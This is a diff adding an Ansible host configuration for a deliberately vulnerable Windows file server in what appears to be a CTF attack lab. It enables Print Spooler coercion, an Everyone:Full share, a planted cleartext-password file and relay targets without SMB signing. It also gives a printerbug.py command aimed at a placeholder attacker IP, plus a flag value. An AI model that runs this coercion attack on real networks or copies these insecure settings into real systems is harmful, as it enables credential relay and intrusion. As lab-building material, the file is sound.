@@ -1,0 +1,89 @@
+---
+# =============================================================================
+# FS01-WIN2019 - File Server
+# =============================================================================
+# Role:        File server with Print Spooler enabled (coercion target)
+# OS:          Windows Server 2019
+# Network:     Internal (172.16.50.11)
+# Attack Path: Phase C, Step 5 (Coercion & Relay)
+# =============================================================================
+
+hostname: FS01
+machine_role: file_server
+attack_phase: "C5"
+attack_name: "PrinterBug/PetitPotam Coercion & NTLM Relay"
+
+# Network
+ansible_host: 172.16.50.11
+ansible_connection: winrm
+ansible_winrm_transport: ntlm
+ansible_winrm_server_cert_validation: ignore
+ansible_port: 5986
+ansible_winrm_scheme: https
+network_segment: internal
+gateway: 172.16.50.1
+
+# OS
+os_family: windows
+os_version: "Windows Server 2019"
+
+# Services
+services:
+  - name: Spooler
+    description: "Print Spooler (PrinterBug/PetitPotam target)"
+    start_mode: auto
+    vulnerability: true
+  - name: LanmanServer
+    port: 445
+    protocol: tcp
+    description: "SMB File Server"
+
+# Windows Features
+windows_features:
+  - Print-Server
+  - FS-FileServer
+
+# SMB Shares
+smb_shares:
+  - name: "CorpFiles"
+    path: 'C:\Shares\CorpFiles'
+    access: "Everyone:Full"
+    description: "Corporate shared files"
+  - name: "IT$"
+    path: 'C:\Shares\IT'
+    full_access: "CORP\\IT Admins"
+    read_access: "CORP\\Domain Users"
+    description: "IT Department hidden share"
+    sensitive_files:
+      - name: "network-passwords.xlsx.txt"
+        description: "Contains cleartext passwords for DB01, APP01, MON01"
+
+# Vulnerabilities
+vulnerabilities:
+  print_spooler:
+    type: "Print Spooler Coercion"
+    vector: "PrinterBug (MS-RPRN) / PetitPotam (MS-EFSRPC)"
+    severity: high
+    cvss: 8.1
+    description: "Force FS01 machine account to authenticate to attacker"
+    exploit: "printerbug.py corp.local/user:pass@172.16.50.11 <attacker_ip>"
+    relay_targets:
+      - host: ws01
+        ip: 172.16.50.21
+        reason: "SMB signing disabled"
+      - host: app01
+        ip: 172.16.50.13
+        reason: "SMB signing disabled"
+
+# CTF Flags
+flags:
+  root:
+    value: "black0ps{pr1nt_sp00l3r_r3l4y}"
+    path: 'C:\Users\Administrator\Desktop\root.txt'
+    owner: Administrator
+    permissions: "admin_only"
+
+# Resource allocation
+vm_memory: 4096
+vm_cpus: 2
+vm_gui: true
